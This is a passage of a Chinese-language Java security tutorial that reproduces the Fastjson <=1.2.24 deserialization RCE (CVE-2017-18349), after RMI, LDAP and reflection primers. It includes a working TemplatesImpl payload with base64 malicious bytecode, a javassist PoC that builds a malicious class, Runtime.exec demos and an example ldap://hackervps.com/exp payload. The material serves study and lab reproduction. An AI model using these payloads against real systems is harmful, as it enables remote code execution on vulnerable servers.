            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
```
接着是服务端代码：
```java
package org.example;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class Server extends UnicastRemoteObject implements Calculator {
    public Server() throws RemoteException {}

    @Override
    public int add(int x, int y) throws RemoteException {
        return x + y;
    }

    @Override
    public int subtract(int a, int b) throws RemoteException {
        return 0;
    }

    @Override
    public int multiply(int a, int b) throws RemoteException {
        return 0;
    }

    @Override
    public int divide(int a, int b) throws RemoteException {
        return 0;
    }

    public static void main(String args[]) {
        try {
            Server obj = new Server();
            LocateRegistry.createRegistry(1060);
            Registry registry = LocateRegistry.getRegistry(1060);
            registry.bind("Calculator", obj);
            System.out.println("Server ready");
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
```
然后开始跑程序，不需要做任何配置。
先把服务端跑起来：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678943334990-44e60d9f-b5c1-40e9-8714-b743509cab0a.png#averageHue=%23f9f8f8&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uab1c2e16&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=154898&status=done&style=none&taskId=u0d799428-063c-4e44-989a-74f0d213abb&title=&width=1536)
然后客户端这里就可以直接运行`5+7`的结果了：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678943374347-f7bd0a65-439e-4fd8-8279-1f624791b3cf.png#averageHue=%23f9f8f7&clientId=u5a3e9323-ecb0-4&from=paste&height=818&id=u313ce13f&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171110&status=done&style=none&taskId=u64403d77-1034-470e-9542-60216a99af3&title=&width=1536)
### （2）深入理解rmi
建议直接看素十八师傅的博客以及天下大木头的微信公众号文章，写的真的是太好了，都是适合细细品味的文章。
> [https://su18.org/post/rmi-attack/](https://su18.org/post/rmi-attack/)
> [https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA](https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA)

## 5. ldap是什么？
`LDAP`是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在`Java`安全中，`LDAP`通常用于集成应用程序与企业目录服务（例如`Microsoft Active Directory`或`OpenLDAP`）的认证和授权功能。
使用`Java`的`LDAP API`，我们可以编写`LDAP`客户端来执行各种`LDAP`操作，如绑定（`bind`）到`LDAP`服务器、搜索目录、添加、修改和删除目录条目等。`Java LDAP API`支持使用简单绑定（`simple bind`）或`Kerberos`身份验证（`Kerberos authentication`）进行`LDAP`身份验证。
`Java`应用程序可以使用`LDAP`来实现单点登录和跨域身份验证，并与其他应用程序和服务共享身份验证信息。`LDAP`还可以用于管理用户、组和权限，以及存储和管理应用程序配置信息等。
总结：`Java`中的`LDAP`是一种使用`Java`编写`LDAP`客户端来集成企业目录服务的技术，可以提供安全的身份验证和授权功能，以及方便的用户和配置管理。
这么说还是太抽象了，我们还是看一个`demo`来快速熟悉一下吧。
### （1）安装并配置ldap服务器
这里我们选择`OpenLDAP`来进行安装。[官网](https://www.openldap.org/)只提供了`Linux`版本，我们可以去德国公司`maxcrc`的官网上面去下载`openldap for windows`：
> [https://www.maxcrc.de/en/download-en/](https://www.maxcrc.de/en/download-en/)

这里我们选择`64`位的，懒人链接：[https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip](https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944181394-19da149a-17be-4bb1-b7a0-cd45da9a87e2.png#averageHue=%23faf9f9&clientId=u5a3e9323-ecb0-4&from=paste&height=746&id=u93f4deae&name=image.png&originHeight=932&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89233&status=done&style=none&taskId=uce2c258a-da0f-46b8-b786-9a5b22682cb&title=&width=1489.6)
然后参考这篇文章进行安装：
> [https://blog.csdn.net/oscar999/article/details/108654461](https://blog.csdn.net/oscar999/article/details/108654461)

成功启动`ldap`服务：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944538078-3326aee5-f7f0-41c1-bcfc-4884a11dd3ea.png#averageHue=%23181818&clientId=u5a3e9323-ecb0-4&from=paste&height=632&id=u19d1bdb8&name=image.png&originHeight=790&originWidth=1480&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=146886&status=done&style=none&taskId=ub6c884dc-3b1e-45f7-aec4-eb1c6bef903&title=&width=1184)
顺便一提，在Windows上可以使用LDAP Browser来快速浏览查看查询，官网及下载地址如下：
> [https://ldapbrowserwindows.com/](https://ldapbrowserwindows.com/)
> [https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi](https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi)

啪的一下就连接上了，快啊，很快啊：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944840530-01d5b61c-415e-425c-9f2a-a0aec5df274e.png#averageHue=%23fbfbfb&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=ua444aab4&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40144&status=done&style=none&taskId=u17aef308-dd39-44d6-bdb7-2f77c1a2a5a&title=&width=1536)
### （2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用
假设有一个名为"`example.com`"的公司，需要存储和管理员工信息。他们使用`LDAP`作为员工信息的目录服务，每个员工都在`LDAP`中有一个唯一的标识符（`DN`）。这里我们举两个员工例子：
```java
DN: uid=john,ou=People,dc=example,dc=com
cn: John Doe
sn: Doe
givenName: John
uid: john
userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=

DN: uid=alice,ou=People,dc=example,dc=com
cn: Alice Smith
sn: Smith
givenName: Alice
uid: alice
userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=
```
在`LDAP`中，`DN`是一个唯一的标识符，它类似于文件系统中的路径。每个`DN`由多个`RDN`（相对区分名称）组成，例如：
```java
uid=john,ou=People,dc=example,dc=com
```
这个`DN`由三个`RDN`组成：`uid=john`、`ou=People`、`dc=example,dc=com`。
可以使用如下`LDAP`查询语句来检索员工信息，例如：`(&(objectClass=person)(uid=john))`
这个查询语句表示查找所有`objectClass`为`person`，且`uid`为`john`的员工信息。在`LDAP`中，查询语句使用`LDAP`搜索过滤器（`LDAP Search Filter`）进行筛选。在`Fastjson`漏洞中，攻击者可以通过构造特定的`LDAP`查询语句，来执行任意代码或获取敏感信息。例如，以下`JSON`字符串包含一个恶意构造的`LDAP URL`：
```java
{"@type":"java.net.URL","val":"ldap://hackervps.com/exp"}
```
当`Fastjson`解析该`JSON`字符串时，会触发`LDAP`查询操作，查询`hackervps.com`上的`LDAP`服务，并执行名为“`exp`”的操作。这就是`Fastjson`漏洞的成因之一。
## 6. java反射是什么？
参考：
> [https://www.javasec.org/javase/Reflection/Reflection.html](https://www.javasec.org/javase/Reflection/Reflection.html)

### （1）通过demo快速理解反射
如果我们不用反射的话，我们写的代码会是下面这样：
`Person.java`：
```java
package org.example;

public class Person {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public void sayHello() {
        System.out.println("Hello, my name is " + name + ", I'm " + age + " years old.");
    }

    public void setAge(int age) {
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```
`Main.java`：
```java
package org.example;

public class Main {
    public static void main(String[] args) {
        // 创建Person对象
        Person person = new Person("张三", 20);

        // 调用Person对象的sayHello方法
        person.sayHello();

        // 修改Person对象的age属性
        person.setAge(30);

        // 输出修改后的Person对象信息
        System.out.println(person);
    }
}
```
运行结果如下：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680265498770-06d129ea-46e6-4a00-9de3-39d99e308515.png#averageHue=%23f9f8f7&clientId=ud95377f6-2eb9-4&from=paste&height=699&id=u610eab0d&name=image.png&originHeight=874&originWidth=1243&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130011&status=done&style=none&taskId=u599905ec-8599-44d8-986f-fd61a3c175e&title=&width=994.4)
可以看到，我们一开始设置人的名字为张三，年龄为`20`，然后我们通过`setAge`方法来修改`Person`的`Age`属性，把年龄改成`30`。
但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到`Java`反射技术。我们可以修改上面的`Main.java`为如下内容：
```java
package org.example;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        // 获取Person类的Class对象
        Class<?> clazz = Class.forName("org.example.Person");

        // 创建Person对象
        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);
        Object person = constructor.newInstance("张三", 20);

        // 调用Person对象的sayHello方法
        Method method = clazz.getMethod("sayHello");
        method.invoke(person);

        // 修改Person对象的age属性
        Field field = clazz.getDeclaredField("age");
        field.setAccessible(true);
        field.set(person, 30);

        // 输出修改后的Person对象信息
        System.out.println(person);
    }
}
```
这样我们就可以来动态创建对象、调用方法以及修改属性等。
#### 问题：我还是觉得你给出的例子体现不出灵活，怎么办？
不急，我们来看这么个例子：
假设我们有一个配置文件，里面记录了类的名称、方法名、属性名等信息，我们可以在运行时读取配置文件，然后使用`Java`反射机制来创建对象、调用方法、修改属性等。这样就可以实现在不修改代码的情况下，根据配置文件来动态地创建对象、调用方法、修改属性，这样不就是很灵活很方便了么？我们来尝试用代码实现下。
先建立一个配置文件，比如叫做`config.properties`，填写如下信息：
```java
class=org.example.Person
method=sayHello
field=age
value=30
name=W01fh4cker
```
然后修改`Main.java`：
```java
package org.example;

import java.io.FileInputStream;
import java.util.Properties;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        // 读取配置文件
        Properties props = new Properties();
        props.load(new FileInputStream("config.properties"));

        // 获取类的名称、方法名、属性名、属性值、姓名
        String className = props.getProperty("class");
        String methodName = props.getProperty("method");
        String fieldName = props.getProperty("field");
        String fieldValue = props.getProperty("value");
        String name = props.getProperty("name");

        // 获取类的Class对象
        Class<?> clazz = Class.forName(className);

        // 获取类的有参构造方法
        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);

        // 创建类的对象
        Object obj = constructor.newInstance(name, 0);

        // 调用方法
        Method method = clazz.getMethod(methodName);
        method.invoke(obj);

        // 修改属性
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, Integer.parseInt(fieldValue));

        // 输出修改后的对象信息
        System.out.println(obj);
    }
}
```
运行结果为：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276045777-f76ed6d9-b4d6-4e9d-839c-30f5ecfdd0be.png#averageHue=%23f9f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u5a11505a&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=209693&status=done&style=none&taskId=uf3c6207e-0ec8-46c8-8ada-0ce738578e6&title=&width=1536)
### （2）【关键！】和漏洞之间的联系？
前面讲了这么多关于反射的内容，可能很多初学者和我现在一样，处于一脸懵逼的状态，为什么要用到反射，而不是直接调用`java.lang.runtime`来执行命令？
例如我们平时经常这么玩：
```java
package org.example;

import org.apache.commons.io.IOUtils;

public class Main {
    public static void main(String[] args) throws Exception {
        System.out.println(IOUtils.toString(Runtime.getRuntime().exec("calc.exe").getInputStream(), "UTF-8"));
    }
}
```
要运行上述代码，需要在maven中引入如下依赖：
```java
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.11.0</version>
</dependency>
```
需要注意的是，要在上述依赖的上线加入`<dependencies></dependencies>`，如下图，然后点击如下图标来自动安装依赖：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276780188-ce707c15-4872-44bc-8f69-9aa3abb27ca5.png#averageHue=%23fbfafa&clientId=ud95377f6-2eb9-4&from=paste&height=481&id=ud3f79683&name=image.png&originHeight=601&originWidth=1386&originalType=binary&ratio=1.25&rotation=0&showTitle=true&size=66917&status=done&style=none&taskId=uc1835653-ba55-436a-9f60-4f526b665c7&title=%E6%AD%A4%E5%9B%BE%E6%98%AF%E5%90%8E%E6%9D%A5%E8%A1%A5%E7%9A%84%EF%BC%8C%E6%80%95%E8%90%8C%E6%96%B0%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%85maven%E4%BE%9D%E8%B5%96&width=1108.8 "此图是后来补的，怕萌新不知道怎么快速安装maven依赖")
![a4218697fec3a30e3ce077ccb178fbe.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276729720-36a6756c-9064-4b40-94bf-6308bd29e040.png#averageHue=%23f9f9f8&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7768c829&name=a4218697fec3a30e3ce077ccb178fbe.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=true&size=127735&status=done&style=none&taskId=u83af4e91-9633-4d94-a87f-67085301d4f&title=%E5%B7%A6%E4%B8%8B%E6%96%B9%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%AD%A3%E5%9C%A8%E4%B8%8B%E8%BD%BD%E4%BE%9D%E8%B5%96&width=1536 "左下方可以看到正在下载依赖")
然后运行程序，就会弹出计算器了：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276862711-f45e3255-7f60-419f-b05f-f14e7bfa2872.png#averageHue=%23f7f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u0b8d64f7&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179612&status=done&style=none&taskId=u634c0f95-8cd8-447f-aeef-7678439b0ee&title=&width=1536)
这么做不就是可以执行命令了吗，为什么还要搞反射呢？
**原来，**`**Java**`**安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取**`**Java**`**的安全权限。获取**`**Java**`**的安全权限需要经过一系列的安全检查，例如检查代码的来源、检查代码的签名等。如果代码没有通过这些安全检查，就无法获取**`**Java**`**的安全权限，从而无法执行危险的操作。然而，反射机制可以绕过**`**Java**`**安全机制的限制，比如可以访问和修改类的私有属性和方法，可以调用类的私有构造方法，可以创建和访问动态代理对象等。这些操作都是**`**Java**`**安全机制所禁止的，但是反射机制可以绕过这些限制，从而执行危险的操作。**
原来如此！好了，现在来学习如何使用反射调用`java.lang.runtime`来执行命令，由于Java9之后，模块化系统被引入，模块化系统会限制反射的使用，从而提高`Java`应用程序的安全性，因此我们要区分版本来学习！为了方便演示，我重新建立了一个项目，并使用`Java8`。
我们先看如下代码：
```java
// Java version: 8
package org.example;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
        Method execMethod = runtimeClass.getMethod("exec", String.class);
        Process process = (Process) execMethod.invoke(Runtime.getRuntime(), "calc.exe");
        InputStream in = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}
```
成功执行：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680277763641-372fcf97-9671-4916-9063-71b32b4ca4dc.png#averageHue=%23f7f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7229a943&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193286&status=done&style=none&taskId=u27a74f91-68b8-4ccd-a609-52611a84a9b&title=&width=1536)
然后再看在`Java17`下的执行反射的代码：
```java
// // Java version: 17
package org.example;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

public class Main {
    public static void main(String[] args) throws Throwable {
        // 获取Runtime类对象
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
        MethodHandle execMethod = MethodHandles.lookup().findVirtual(runtimeClass, "exec", MethodType.methodType(Process.class, String.class));
        Process process = (Process) execMethod.invokeExact(Runtime.getRuntime(), "calc.exe");
        InputStream in = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}
```
执行结果：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680278080283-7812f55e-015f-47a2-a195-72427beac360.png#averageHue=%23f7f6f4&clientId=ud95377f6-2eb9-4&from=paste&height=819&id=u67b7cb21&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210532&status=done&style=none&taskId=u48718344-5315-40b3-8edc-a6d96955e58&title=&width=1536)
# 二、漏洞学习
## 1. fastjson<=1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）
### （1）漏洞简单复现
我们看以下案例：
首先创建一个`maven`项目、导入`Fastjson1.2.23`并自动下载相关依赖（怎么自动下载的见上文配图）：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680362559966-b2204359-9c98-40ab-bbe4-2a4edda1caaf.png#averageHue=%23f9f8f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7bb5dc5f&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145481&status=done&style=none&taskId=ub1d23e6a-5fd8-483e-8b6f-fc3fc32970d&title=&width=1536)
然后写入如下代码至`Main.java`（此时已经不需要`Person.java`了）：
```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
        ParserConfig config = new ParserConfig();
        String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }}";
        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
    }
}
```
运行之后直接弹出计算器：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680531505319-fa84e999-7bcc-4ab6-88d1-19f1320c3600.png#averageHue=%23cdbd80&clientId=u8272b843-0f56-4&from=paste&height=823&id=uc52db734&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=341524&status=done&style=none&taskId=u0e020ad7-3fe4-46d4-94ec-9f98e57fb3b&title=&width=1536)
### （2）漏洞成因分析
上面的`text`里面的`_bytecodes`的内容是以下内容编译成字节码文件后（`.class`）再`base64`编码后的结果：
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}
```
可以看到，我们通过以上代码直接定义类`Test`，并在类的构造方法中执行`calc`的命令；至于为什么要写上述代码的第`14`-`21`行，因为`Test`类是继承`AbstractTranslet`的，上述代码的两个`transform`方法都是实现`AbstractTranslet`接口的抽象方法，因此都是需要的；具体来说的话，第一个`transform`带有`SerializationHandler`参数，是为了把`XML`文档转换为另一种格式，第二个`transform`带有`DTMAxisIterator`参数，是为了对`XML`文档中的节点进行迭代。
**总结**：对于上述代码，应该这么理解：建立`Test`类，并让其继承`AbstractTranslet`类，然后通过`Test t = new Test();`来初始化，这样我就是假装要把`xml`文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行`calc`，所以会弹出计算器。
#### ①问题1：为什么要继承`AbstractTranslet`类？
参考`Y4tacker`师傅的文章：
> [https://blog.csdn.net/solitudi/article/details/119082164](https://blog.csdn.net/solitudi/article/details/119082164)

但是在实战场景中，`Java`的`ClassLoader`类提供了`defineClass()`方法，可以把字节数组转换成`Java`类的示例，但是这里面的方法的作用域是被`Protected`修饰的，也就是说这个方法只能在`ClassLoader`类中访问，不能被其他包中的类访问：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680590757100-eb95f1f7-40f6-4d0e-9709-e05ec7fd2f05.png#averageHue=%23f7f6ee&clientId=u8272b843-0f56-4&from=paste&height=501&id=u7f65687c&name=image.png&originHeight=626&originWidth=1663&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129161&status=done&style=none&taskId=ucc0eb086-134e-4e75-971f-1440c66f5e8&title=&width=1330.4)
但是，在`TransletClassLoader`类中，`defineClass`调用了`ClassLoader`里面的`defineClass`方法：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680590943310-12009aa2-effc-4ba3-9ea3-3d9e71b1e27b.png#averageHue=%23f9f7ee&clientId=u8272b843-0f56-4&from=paste&height=673&id=uf214e094&name=image.png&originHeight=841&originWidth=1627&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=177301&status=done&style=none&taskId=u739d2600-283f-43c4-a34d-3f37b5675be&title=&width=1301.6)
然后追踪`TransletClassLoader`，发现是`defineTransletClasses`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591071672-d20557c6-a17f-4e54-b067-02a5a910ba00.png#averageHue=%23f9f7ef&clientId=u8272b843-0f56-4&from=paste&height=800&id=u1b179c9a&name=image.png&originHeight=1000&originWidth=1667&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=217032&status=done&style=none&taskId=ub78e3007-2549-44d3-a28d-04ff105aadc&title=&width=1333.6)
再往上，发现是`getTransletInstance`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591219803-00065e5e-90d0-4ea9-b479-581757ad459a.png#averageHue=%23f9f7f0&clientId=u8272b843-0f56-4&from=paste&height=818&id=ucd5e69df&name=image.png&originHeight=1023&originWidth=1758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=233805&status=done&style=none&taskId=uad2e9d73-4970-4c88-9954-2c18b173cd0&title=&width=1406.4)
到此为止，要么是`Private`修饰要么就是`Protected`修饰，再往上继续追踪，发现是`newTransformer`，可以看到此时已经是`public`了：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591302146-a7b5b704-09d7-415a-9ca3-758299c2ff8f.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=818&id=ud66221b0&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=227283&status=done&style=none&taskId=u192efad0-965c-407e-847d-e6e933611b0&title=&width=1536)
因此，我们的利用链是：
```java
TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
```
基于此，我们可以写出如下`POC`：
```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;

public class Main {
    public static class test{
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";

        cc.makeClassInitializer().insertBefore(cmd);

        String randomClassName = "W01fh4cker" + System.nanoTime();
        cc.setName(randomClassName);

        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));

        try {
            byte[] evilCode = cc.toBytecode();
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{"+
                    "\"@type\":\"" + NASTY_CLASS +"\","+
                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                    "'_name':'W01h4cker',"+
                    "'_tfactory':{ },"+
                    "'_outputProperties':{ }"+
                    "}\n";
            ParserConfig config = new ParserConfig();
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
这段代码就可以动态生成恶意类，执行效果如下：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680592080496-8eff1e08-d95e-4b92-8b44-2579a56b705b.png#averageHue=%23f7f5f2&clientId=u8272b843-0f56-4&from=paste&height=818&id=u0860b899&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=270888&status=done&style=none&taskId=u7149eba7-8b8d-4b15-9b99-aa6aca29b2c&title=&width=1536)
#### ②为什么要这么构造`json`？
可以看到，我们最终构造的json数据为：
```java
{
	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
	"_bytecodes": ["yv66vgAAADQA...CJAAk="],
	"_name": "W01fh4cker",
	"_tfactory": {},
	"_outputProperties": {},
}
```
为什么这么构造呢？还是直接看`defineTransletClasses`这里：
